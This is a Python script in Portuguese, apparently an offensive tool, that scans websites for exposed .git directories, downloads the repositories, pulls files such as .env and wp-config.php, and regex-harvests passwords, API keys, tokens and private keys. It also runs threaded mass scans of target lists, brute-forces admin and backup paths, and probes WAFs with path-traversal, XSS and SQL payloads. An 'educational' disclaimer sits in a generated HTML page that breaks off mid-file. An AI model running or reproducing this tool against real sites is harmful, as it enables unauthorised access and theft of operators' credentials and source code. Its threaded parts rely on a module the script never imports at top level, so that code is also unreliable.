#!/usr/bin/env python3
import os
import sys
import random
import requests
import threading
import time
import re
import subprocess
import json
import logging
from datetime import datetime
from urllib.parse import urlparse

# Configurações de cores para o terminal
class Colors:
    PINK = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    LIGHT_CYAN = '\033[1;36m'
    BG_PINK = '\033[48;5;218m'
    BG_LIGHT_BLUE = '\033[48;5;153m'

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='kawaii_git_tool.log',
    filemode='a'
)

# Carinhas fofas e emojis para mensagens
KAWAII_FACES = [
    "(◕‿◕✿)", "(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", "✧･ﾟ: *✧･ﾟ:*", "(◠‿◠)", "(ᗒᗨᗕ)", 
    "(★ω★)", "(ﾉ´ヮ`)ﾉ*: ･ﾟ", "(ノ°ο°)ノ", "(◕‿◕)♡", "ヽ(>∀<☆)ノ",
    "(づ｡◕‿‿◕｡)づ", "♡(˃͈ દ ˂͈ ༶ )", "(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧", "(◍•ᴗ•◍)❤", 
    "♪(๑ᴖ◡ᴖ๑)♪", "(っ◔◡◔)っ ♥", "(´･ᴗ･ ` )", "(●´□`)♡", "(´｡• ᵕ •｡`) ♡",
    "🌸", "🍓", "🍬", "🎀", "💖", "✨", "🎇", "🧁", "🐇", "🦄"
]

class Config:
    def __init__(self):
        self.timeout = 10
        self.max_threads = 5
        self.proxies = None
        self.color_mode = True
        self.emoji_mode = True
        self.output_format = 'text'
        
        # Tentar carregar configurações salvas
        self.load_config()
    
    def load_config(self):
        try:
            if os.path.exists('kawaii_config.json'):
                with open('kawaii_config.json', 'r') as f:
                    data = json.load(f)
                    self.timeout = data.get('timeout', self.timeout)
                    self.max_threads = data.get('max_threads', self.max_threads)
                    self.proxies = data.get('proxies', self.proxies)
                    self.color_mode = data.get('color_mode', self.color_mode)
                    self.emoji_mode = data.get('emoji_mode', self.emoji_mode)
                    self.output_format = data.get('output_format', self.output_format)
        except Exception as e:
            logging.error(f"Error loading config: {str(e)}")

    def save_config(self):
        try:
            with open('kawaii_config.json', 'w') as f:
                json.dump({
                    'timeout': self.timeout,
                    'max_threads': self.max_threads,
                    'proxies': self.proxies,
                    'color_mode': self.color_mode,
                    'emoji_mode': self.emoji_mode,
                    'output_format': self.output_format
                }, f)
        except Exception as e:
            logging.error(f"Error saving config: {str(e)}")

config = Config()

def get_kawaii_face():
    return random.choice(KAWAII_FACES) if config.emoji_mode else ""

def c(text, color):
    return color + text + Colors.END if config.color_mode else text

def print_banner():
    banner = f"""
{c('╔════════════════════════════════════════════════════════════════════════════╗', Colors.PINK)}
{c('║', Colors.PINK)}{c('   ♡🌸🍓 ', Colors.BOLD)}{c('Kawaii Git Exploit Tool Ultra Fofinha Deluxe  🍓🌸♡     ', Colors.MAGENTA)}{c('║', Colors.PINK)}
{c('║', Colors.PINK)}                                                                        {c('║', Colors.PINK)}
{c('║    ', Colors.PINK)}{c('✧･ﾟ: *✧･ﾟ:* Explorador de Vulnerabilidades Git Pro *:･ﾟ✧*:･ﾟ✧    ', Colors.LIGHT_CYAN)}{c('║', Colors.PINK)}
{c('║', Colors.PINK)}                                                                        {c('║', Colors.PINK)}
{c('║    ', Colors.PINK)}{c('Desenvolvido com 💖 pela Rede Valkiria - Contra CP & Fraudes       ', Colors.YELLOW)}{c('║', Colors.PINK)}
{c('║', Colors.PINK)}                                                                        {c('║', Colors.PINK)}
{c('║    ', Colors.PINK)}{c('Versão: 3.0 Super Fofinha ', Colors.CYAN)}{get_kawaii_face()}{c(f' {datetime.now().year}                            ', Colors.PINK)}{c('║', Colors.PINK)}
{c('╚════════════════════════════════════════════════════════════════════════════╝', Colors.PINK)}
{c('', Colors.END)}"""
    print(banner)

def print_menu():
    menu = f"""
{c('╔═══════════════════════════ 🌸 MENU PRINCIPAL 🌸 ═══════════════════════════╗', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('1. Verificar Git exposto', Colors.CYAN)}{c('                        ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('2. Explorar arquivos do Git', Colors.CYAN)}{c('                     ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('3. Baixar repositório Git', Colors.CYAN)}{c('                       ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('4. Buscar credenciais em arquivos', Colors.CYAN)}{c('               ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('5. Varredura em massa de sites', Colors.CYAN)}{c('                  ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('6. Scanner Avançado de Diretórios', Colors.CYAN)}{c('               ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('7. Criar site educativo', Colors.CYAN)}{c('                         ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('8. Iniciar servidor local', Colors.CYAN)}{c('                       ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('9. Configurações', Colors.CYAN)}{c('                                ', Colors.PINK)}{get_kawaii_face()}{c(' ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('0. Sair', Colors.RED)}{c('                                         (╥﹏╥) ', Colors.PINK)}{c('║', Colors.PINK)}
{c('╚════════════════════════════════════════════════════════════════════════════╝', Colors.PINK)}
{c('', Colors.END)}"""
    print(menu)

def print_settings_menu():
    menu = f"""
{c('╔══════════════════════════ 🌸 CONFIGURAÇÕES 🌸 ═══════════════════════════╗', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('1. Timeout das requisições (atual: {config.timeout}s)', Colors.CYAN)}{c('          ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('2. Número máximo de threads (atual: {config.max_threads})', Colors.CYAN)}{c('       ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('3. Configurar proxies', Colors.CYAN)}{c('                                  ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('4. Modo colorido (atual: {"ON" if config.color_mode else "OFF"})', Colors.CYAN)}{c('          ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('5. Modo emoji (atual: {"ON" if config.emoji_mode else "OFF"})', Colors.CYAN)}{c('            ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('6. Formato de saída (atual: {config.output_format.upper()})', Colors.CYAN)}{c('              ', Colors.PINK)}{c('║', Colors.PINK)}
{c('║ ', Colors.PINK)}{c('0. Voltar ao menu principal', Colors.RED)}{c('                          (╥﹏╥) ', Colors.PINK)}{c('║', Colors.PINK)}
{c('╚════════════════════════════════════════════════════════════════════════════╝', Colors.PINK)}
{c('', Colors.END)}"""
    print(menu)

def check_dependencies():
    missing = []
    try:
        import requests
    except ImportError:
        missing.append("requests")
    
    try:
        import concurrent.futures
    except ImportError:
        missing.append("concurrent.futures")
    
    return missing

def install_dependencies():
    missing = check_dependencies()
    if missing:
        print(c(f"\n🌸 As seguintes dependências estão faltando: {', '.join(missing)}", Colors.YELLOW))
        choice = input(c("🌸 Deseja instalar automaticamente? (s/n): ", Colors.CYAN)).lower()
        if choice == 's':
            try:
                import pip
                for package in missing:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(c("\n🌸 Dependências instaladas com sucesso!", Colors.GREEN))
                return True
            except Exception as e:
                print(c(f"\n(╥﹏╥) Erro ao instalar dependências: {str(e)}", Colors.RED))
                return False
        else:
            print(c("\n🌸 Algumas funcionalidades podem não estar disponíveis", Colors.YELLOW))
            return False
    return True

def press_enter_to_continue():
    input(c(f"\n🌸 Pressione Enter para continuar... {get_kawaii_face()}", Colors.PINK))
    print("\n" * 2)

def make_request(url, method='GET', timeout=None, headers=None):
    try:
        timeout = timeout or config.timeout
        headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.request(
            method,
            url,
            headers=headers,
            timeout=timeout,
            proxies=config.proxies,
            verify=False,
            allow_redirects=True
        )
        return response
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed to {url}: {str(e)}")
        return None

def check_waf(url):
    test_url = url.rstrip('/') + '/.git/'
    test_payloads = [
        ("../../../../etc/passwd", 400),
        ("<script>alert(1)</script>", 400),
        ("UNION SELECT", 500)
    ]
    
    print(c("\n🌸 Verificando proteção WAF...", Colors.PINK))
    
    for payload, expected_code in test_payloads:
        test_path = test_url + payload
        response = make_request(test_path)
        
        if response and response.status_code == expected_code:
            print(c(f"★ WAF detectado! Bloqueou payload: {payload}", Colors.RED))
            return True
    
    print(c("🌸 Nenhum WAF detectado", Colors.GREEN))
    return False

def check_git_exposed(url):
    try:
        print(c(f"\n✧･ﾟ: *✧･ﾟ:* Verificando {url} *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        
        if not url.endswith('/.git/'):
            url = url.rstrip('/') + '/.git/'
        
        files_to_check = [
            'HEAD', 'objects/info/packs', 'description',
            'config', 'COMMIT_EDITMSG', 'index',
            'info/refs', 'logs/HEAD', 'refs/heads/master'
        ]
        
        found_files = []
        
        for filename in files_to_check:
            target_url = url + filename
            print(c(f"🌸 Verificando: {filename}", Colors.CYAN), end='\r')
            
            response = make_request(target_url)
            if response and response.status_code == 200:
                print(c(f"★ Arquivo encontrado: {filename.ljust(50)}", Colors.GREEN))
                found_files.append(filename)
            else:
                print(c(f"🌸 Arquivo não encontrado: {filename.ljust(50)}", Colors.YELLOW))
        
        # Verificar diretório de objetos
        objects_url = url + 'objects/'
        print(c("🌸 Verificando diretório de objetos...", Colors.CYAN), end='\r')
        response = make_request(objects_url)
        if response and response.status_code == 200:
            print(c("★ Diretório de objetos encontrado!", Colors.GREEN))
            found_files.append('objects/')
        else:
            print(c("🌸 Diretório de objetos não encontrado.", Colors.YELLOW))
        
        if len(found_files) >= 3:
            print(c(f"\n{get_kawaii_face()} Git exposto encontrado! Arquivos descobertos: {len(found_files)}", Colors.GREEN))
            return True, found_files
        else:
            print(c("\n(´• ω •`) Git não exposto ou inacessível", Colors.RED))
            return False, []
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro na verificação: {str(e)}", Colors.RED))
        logging.error(f"Error in check_git_exposed: {str(e)}")
        return False, []

def explore_git(url, found_files):
    try:
        print(c(f"\n✧･ﾟ: *✧･ﾟ:* Explorando arquivos em {url} *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        
        interesting_files = [
            'config', 'HEAD', 'logs/HEAD', 'index',
            'COMMIT_EDITMSG', 'info/exclude', 'description',
            '.env', 'wp-config.php', 'config.php',
            'database.yml', 'settings.py', 'credentials.json',
            'secrets.ini', 'config.json', 'appsettings.json',
            'configuration.php', 'db.php', 'database.ini',
            'secret_key', 'oauth_token', 'aws_credentials'
        ]
        
        sensitive_files = []
        
        for filename in interesting_files:
            target_url = url + filename
            print(c(f"🌸 Verificando: {filename}", Colors.CYAN), end='\r')
            
            response = make_request(target_url)
            if response and response.status_code == 200:
                print(c(f"★ Arquivo encontrado: {filename.ljust(50)}", Colors.GREEN))
                sensitive_files.append(filename)
                
                # Verificar automaticamente por credenciais em arquivos sensíveis
                if any(x in filename.lower() for x in ['config', '.env', 'wp-config', 'secret', 'credential']):
                    search_credentials_in_file(target_url, response.text)
            else:
                print(c(f"🌸 Arquivo não encontrado: {filename.ljust(50)}", Colors.YELLOW))
        
        if sensitive_files:
            print(c(f"\n{get_kawaii_face()} Arquivos sensíveis encontrados: {len(sensitive_files)}", Colors.GREEN))
            print(c(f"🌸 Arquivos encontrados: {', '.join(sensitive_files)}", Colors.YELLOW))
        else:
            print(c("\n(´• ω •`) Nenhum arquivo sensível encontrado", Colors.YELLOW))
        
        return sensitive_files
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro na exploração: {str(e)}", Colors.RED))
        logging.error(f"Error in explore_git: {str(e)}")
        return []

def download_git_repo(url):
    try:
        print(c(f"\n✧･ﾟ: *✧･ﾟ:* Baixando repositório de {url} *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        
        # Verificar se o git-dumper está instalado
        git_dumper_installed = False
        try:
            result = subprocess.run(["git-dumper", "--version"], 
                                  stdout=subprocess.PIPE, 
                                  stderr=subprocess.PIPE,
                                  timeout=5)
            if result.returncode == 0:
                git_dumper_installed = True
        except:
            pass
        
        if git_dumper_installed:
            # Usar git-dumper se estiver instalado
            output_dir = url.split('//')[-1].replace('/', '_') + "_git"
            print(c("🌸 Usando git-dumper para baixar o repositório...", Colors.CYAN))
            
            try:
                subprocess.run(["git-dumper", url, output_dir], check=True)
                print(c(f"\n{get_kawaii_face()} Repositório baixado com sucesso em: {output_dir}", Colors.GREEN))
                return True
            except subprocess.CalledProcessError as e:
                print(c(f"\n(╥﹏╥) Erro ao baixar repositório: {str(e)}", Colors.RED))
                return False
        else:
            # Método manual se git-dumper não estiver instalado
            print(c("🌸 git-dumper não encontrado. Tentando método manual...", Colors.YELLOW))
            
            if not url.endswith('/.git/'):
                url = url.rstrip('/') + '/.git/'
            
            output_dir = url.split('//')[-1].replace('/', '_') + "_manual"
            os.makedirs(output_dir, exist_ok=True)
            
            files_to_download = [
                'HEAD', 'objects/info/packs', 'description',
                'config', 'COMMIT_EDITMSG', 'index',
                'info/refs', 'logs/HEAD', 'refs/heads/master'
            ]
            
            success = True
            
            for filename in files_to_download:
                target_url = url + filename
                output_path = os.path.join(output_dir, filename)
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                
                print(c(f"🌸 Baixando: {filename}", Colors.CYAN), end='\r')
                
                response = make_request(target_url)
                if response and response.status_code == 200:
                    with open(output_path, 'wb') as f:
                        f.write(response.content)
                    print(c(f"✓ Arquivo baixado: {filename.ljust(50)}", Colors.GREEN))
                else:
                    print(c(f"🌸 Arquivo não encontrado: {filename.ljust(50)}", Colors.YELLOW))
                    success = False
            
            if success:
                print(c(f"\n{get_kawaii_face()} Download manual concluído em: {output_dir}", Colors.GREEN))
                print(c("🌸 Nota: O download manual pode não incluir todos os arquivos.", Colors.YELLOW))
                return True
            else:
                print(c("\n(╥﹏╥) Download manual incompleto. Alguns arquivos falharam.", Colors.RED))
                return False
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro no download: {str(e)}", Colors.RED))
        logging.error(f"Error in download_git_repo: {str(e)}")
        return False

def search_credentials_in_file(url, content=None):
    try:
        if content is None:
            response = make_request(url)
            if response and response.status_code == 200:
                content = response.text
            else:
                print(c(f"(╥﹏╥) Erro ao acessar arquivo: {response.status_code if response else 'No response'}", Colors.RED))
                return
        
        patterns = [
            r'(?i)user(name)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)pass(word)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)host\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)db(name)?\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)api_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)secret\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)token\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)password\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)connection_?string\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)access_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)secret_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)private_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]',
            r'(?i)encryption_?key\s*[:=]\s*[\'"]?(.*?)[\'"]?[\s;,]'
        ]
        
        found_creds = []
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                if isinstance(match, tuple):
                    # Pegar o último elemento não vazio do grupo de captura
                    value = next((x for x in match[::-1] if x), None)
                    if value and value not in found_creds:
                        found_creds.append(value)
                elif match and match not in found_creds:
                    found_creds.append(match)
        
        if found_creds:
            print(c("\n(★ω★) Credenciais encontradas no arquivo!", Colors.GREEN))
            for cred in found_creds:
                print(c(f"• {cred}", Colors.RED))
            
            # Perguntar se deseja salvar as credenciais encontradas
            save = input(c("\n🌸 Deseja salvar as credenciais encontradas em um arquivo? (s/n): ", Colors.CYAN)).lower()
            if save == 's':
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"credenciais_encontradas_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"Credenciais encontradas em: {url}\n")
                    f.write(f"Data: {datetime.now()}\n\n")
                    for cred in found_creds:
                        f.write(f"{cred}\n")
                print(c(f"🌸 Credenciais salvas em: {filename}", Colors.GREEN))
        else:
            print(c("\n(´･_･`) Nenhuma credencial encontrada no arquivo", Colors.YELLOW))
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro na busca de credenciais: {str(e)}", Colors.RED))
        logging.error(f"Error in search_credentials_in_file: {str(e)}")

def mass_scan(targets):
    try:
        print(c("\n✧･ﾟ: *✧･ﾟ:* Iniciando varredura em massa *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        print(c(f"🌸 Alvos a verificar: {len(targets)}", Colors.CYAN))
        
        vulnerable_sites = []
        lock = threading.Lock()
        
        def check_target(target):
            nonlocal vulnerable_sites
            target = target.strip()
            if not target:
                return
            
            # Verificar caminhos .git padrão e alternativos
            paths_to_check = ['/.git/', '/.git/HEAD', '/git/HEAD', '/.git/config']
            
            found = False
            found_files = []
            
            for path in paths_to_check:
                url = target.rstrip('/') + path
                
                response = make_request(url)
                if response and response.status_code == 200:
                    found = True
                    found_files.append(path.split('/')[-1] or path.split('/')[-2])
                    with lock:
                        vulnerable_sites.append((target, found_files))
                    break
            
            with lock:
                progress = len(vulnerable_sites) + sum(1 for t in targets if not t.strip())
                print(c(f"🌸 Progresso: {progress}/{len(targets)} - Vulneráveis: {len(vulnerable_sites)}", Colors.CYAN), end='\r')
        
        # Usar ThreadPoolExecutor para limitar o número de threads
        with concurrent.futures.ThreadPoolExecutor(max_workers=config.max_threads) as executor:
            executor.map(check_target, targets)
        
        if vulnerable_sites:
            print(c(f"\n{get_kawaii_face()} Varredura concluída - {len(vulnerable_sites)} alvos vulneráveis encontrados!", Colors.GREEN))
            
            # Salvar resultados no formato escolhido
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if config.output_format == 'json':
                filename = f"resultados_varredura_{timestamp}.json"
                data = {
                    "metadata": {
                        "date": datetime.now().isoformat(),
                        "total_targets": len(targets),
                        "vulnerable_targets": len(vulnerable_sites)
                    },
                    "results": [
                        {"url": site, "found_files": files} for site, files in vulnerable_sites
                    ]
                }
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2)
            elif config.output_format == 'csv':
                filename = f"resultados_varredura_{timestamp}.csv"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("URL,Arquivos_Encontrados\n")
                    for site, files in vulnerable_sites:
                        f.write(f"{site},{'|'.join(files)}\n")
            else:  # texto
                filename = f"resultados_varredura_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"Resultados da varredura em massa - {datetime.now()}\n")
                    f.write(f"Total de alvos verificados: {len(targets)}\n")
                    f.write(f"Alvos vulneráveis encontrados: {len(vulnerable_sites)}\n\n")
                    
                    for site, files in vulnerable_sites:
                        f.write(f"★ Alvo vulnerável: {site}\n")
                        f.write(f"Arquivos encontrados: {', '.join(files)}\n")
                        f.write("-" * 50 + "\n")
            
            print(c(f"🌸 Resultados salvos em: {filename}", Colors.GREEN))
            
            # Mostrar resumo dos resultados
            print(c("\n✧･ﾟ: *✧･ﾟ:* Resumo da Varredura *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
            for site, files in vulnerable_sites:
                print(c(f"\n★ Alvo vulnerável: {site}", Colors.RED))
                print(c(f"🌸 Arquivos encontrados: {', '.join(files)}", Colors.YELLOW))
        else:
            print(c("\n(´• ω •`) Varredura concluída - nenhum alvo vulnerável encontrado", Colors.YELLOW))
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro na varredura em massa: {str(e)}", Colors.RED))
        logging.error(f"Error in mass_scan: {str(e)}")

def advanced_directory_scanner(url):
    try:
        print(c("\n✧･ﾟ: *✧･ﾟ:* Iniciando Scanner Avançado *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        print(c(f"🌸 Alvo: {url}", Colors.CYAN))
        
        # Lista de diretórios comuns para verificar
        common_dirs = [
            'admin', 'backup', 'config', 'database', 'logs',
            'secret', 'private', 'uploads', 'download', 'tmp',
            'wp-admin', 'wp-content', 'wp-includes', 'vendor',
            'storage', 'assets', 'images', 'js', 'css',
            'cgi-bin', 'phpmyadmin', 'mysql', 'sql', 'backups',
            'old', 'test', 'dev', 'beta', 'alpha'
        ]
        
        # Lista de arquivos comuns para verificar
        common_files = [
            'config.php', 'wp-config.php', '.env', 'settings.py',
            'database.yml', 'credentials.json', 'secrets.ini',
            'backup.zip', 'dump.sql', 'backup.tar.gz',
            'index.php', 'login.php', 'admin.php',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml',
            'phpinfo.php', 'test.php', 'info.php'
        ]
        
        found_items = []
        lock = threading.Lock()
        
        def check_item(item, is_dir=False):
            nonlocal found_items
            if is_dir:
                target_url = url.rstrip('/') + '/' + item + '/'
            else:
                target_url = url.rstrip('/') + '/' + item
            
            response = make_request(target_url)
            if response:
                if response.status_code == 200:
                    status = f"{item}/" if is_dir else item
                    with lock:
                        found_items.append(status)
                elif response.status_code == 403:
                    status = f"{item}/ (403)" if is_dir else f"{item} (403)"
                    with lock:
                        found_items.append(status)
            
            with lock:
                progress = len(found_items)
                total = len(common_dirs) + len(common_files)
                print(c(f"🌸 Progresso: {progress}/{total} - Itens encontrados: {progress}", Colors.CYAN), end='\r')
        
        # Verificar diretórios
        print(c("\n✧･ﾟ: *✧･ﾟ:* Verificando diretórios comuns *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        with concurrent.futures.ThreadPoolExecutor(max_workers=config.max_threads) as executor:
            executor.map(lambda d: check_item(d, True), common_dirs)
        
        # Verificar arquivos
        print(c("\n✧･ﾟ: *✧･ﾟ:* Verificando arquivos comuns *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
        with concurrent.futures.ThreadPoolExecutor(max_workers=config.max_threads) as executor:
            executor.map(check_item, common_files)
        
        if found_items:
            print(c(f"\n{get_kawaii_face()} Scanner concluído - {len(found_items)} itens encontrados!", Colors.GREEN))
            
            # Salvar resultados no formato escolhido
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if config.output_format == 'json':
                filename = f"resultados_scanner_{timestamp}.json"
                data = {
                    "metadata": {
                        "date": datetime.now().isoformat(),
                        "target": url,
                        "total_items": len(common_dirs) + len(common_files),
                        "found_items": len(found_items)
                    },
                    "results": found_items
                }
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2)
            elif config.output_format == 'csv':
                filename = f"resultados_scanner_{timestamp}.csv"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("Item,Status\n")
                    for item in found_items:
                        f.write(f"{item}\n")
            else:  # texto
                filename = f"resultados_scanner_{timestamp}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"Resultados do scanner - {datetime.now()}\n")
                    f.write(f"Alvo: {url}\n\n")
                    
                    for item in found_items:
                        f.write(f"{item}\n")
            
            print(c(f"🌸 Resultados salvos em: {filename}", Colors.GREEN))
            
            # Mostrar resumo dos resultados
            print(c("\n✧･ﾟ: *✧･ﾟ:* Resumo do Scanner *:･ﾟ✧*:･ﾟ✧", Colors.PINK))
            for item in found_items:
                if "403" in item:
                    print(c(f"• {item}", Colors.YELLOW))
                else:
                    print(c(f"• {item}", Colors.RED))
        else:
            print(c("\n(´• ω •`) Scanner concluído - nenhum item sensível encontrado", Colors.YELLOW))
    except Exception as e:
        print(c(f"\n(╥﹏╥) Erro no scanner: {str(e)}", Colors.RED))
        logging.error(f"Error in advanced_directory_scanner: {str(e)}")

def create_site():
    try:
        site_dir = "kawaii_site"
        if not os.path.exists(site_dir):
            os.makedirs(site_dir)
        
        # Criar arquivo index.html
        html_content = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Git Exposed - Rede Valkiria</title>
    <style>
        body {{
            font-family: 'Comic Sans MS', cursive, sans-serif;
            background-color: #fff0f5;
            color: #ff69b4;
            margin: 0;
            padding: 0;
            background-image: url('https://i.pinimg.com/originals/49/61/1f/49611f1c5a3e0a8e963f8a3b8e9f1416.gif');
            background-size: cover;
        }}
        
        .container {{
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(255, 240, 245, 0.95);
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255, 105, 180, 0.6);
            margin-top: 30px;
            margin-bottom: 30px;
            border: 3px dashed #ff69b4;
        }}
        
        header {{
            text-align: center;
            padding: 20px 0;
            border-bottom: 3px dotted #ff69b4;
            margin-bottom: 30px;
        }}
        
        h1 {{
            color: #ff1493;
            font-size: 2.8em;
            text-shadow: 3px 3px 5px rgba(255, 182, 193, 0.8);
            margin-bottom: 10px;
        }}
        
        h2 {{
            color: #ff69b4;
            border-bottom: 2px dotted #ff69b4;
            padding-bottom: 8px;
            font-size: 1.8em;
        }}
        
        .kawaii {{
            font-size: 1.8em;
            margin: 15px 0;
            color: #db7093;
        }}
        
        .anime-girl {{
            float: right;
            width: 220px;
            margin-left: 25px;
            animation: bounce 2s infinite;
            border-radius: 20px;
            border: 3px solid #ff69b4;
        }}
        
        @keyframes bounce {{
            0%, 100% {{ transform: translateY(0); }}
            50% {{ transform: translateY(-25px); }}
        }}
        
        .dancing {{
            display: inline-block;
            animation: dance 1s infinite alternate;
            font-size: 1.2em;
        }}
        
        @keyframes dance {{
            0% {{ transform: rotate(-10deg); }}
            100% {{ transform: rotate(10deg); }}
        }}
        
        .warning {{
            background-color: #fff0f5;
            border-left: 5px solid #ff69b4;
            padding: 15px;
            margin: 20px 0;
            border-radius: 10px;
            border: 2px dashed #ff1493;
        }}
        
        footer {{
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 3px dotted #ff69b4;
            font-size: 1em;
            color: #db7093;
        }}
        
        .btn {{
            background-color: #ff69b4;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 50px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 15px 0;
            transition: all 0.3s;
            font-size: 1.1em;
            box-shadow: 0 4px 8px rgba(255, 105, 180, 0.3);
        }}
        
        .btn:hover {{
            background-color: #ff1493;
            transform: scale(1.1);
            box-shadow: 0 6px 12px rgba(255, 20, 147, 0.4);
        }}
        
        ul {{
            list-style-type: none;
            padding-left: 20px;
        }}
        
        ul li:before {{
            content: "🌸 ";
        }}
        
        .heart {{
            color: #ff69b4;
            animation: heartbeat 1.5s infinite;
            display: inline-block;
        }}
        
        @keyframes heartbeat {{
            0% {{ transform: scale(1); }}
            25% {{ transform: scale(1.2); }}
            50% {{ transform: scale(1); }}
            75% {{ transform: scale(1.2); }}
            100% {{ transform: scale(1); }}
        }}
        
        .floating {{
            animation: floating 3s ease-in-out infinite;
        }}
        
        @keyframes floating {{
            0% {{ transform: translateY(0px); }}
            50% {{ transform: translateY(-15px); }}
            100% {{ transform: translateY(0px); }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Git Exposed Vulnerability <span class="dancing">(◕‿◕✿)</span></h1>
            <p class="kawaii">✧･ﾟ: *✧･ﾟ:* Entenda a vulnerabilidade *:･ﾟ✧*:･ﾟ✧</p>
        </header>
        
        <section>
            <img src="https://i.pinimg.com/originals/0f/2a/c5/0f2ac5e94e1a9a0d5e7c2f4e4b8a8d2a.gif" alt="Anime Girl" class="anime-girl floating">
            
            <h2>🌸 O que é a vulnerabilidade Git exposto?</h2>
            <p>Um repositório Git exposto ocorre quando o diretório <code>.git</code> de um site fica acessível publicamente na internet. Isso permite que qualquer pessoa baixe todo o código-fonte do projeto, incluindo possíveis credenciais e informações sensíveis.</p>
            
            <div class="warning">
                <h3>✧･ﾟ: * Atenção! *:･ﾟ✧</h3>
                <p>Esta ferramenta foi desenvolvida apenas para fins educacionais e de teste de segurança. Nunca use essas informações para atividades ilegais!</p>
                <p class="kawaii">(ﾉ◕ヮ◕)ﾉ*:･ﾟ✧ Seja um hacker ético! ✧･ﾟ: *✧･ﾟ:*</p>
            </div>
            
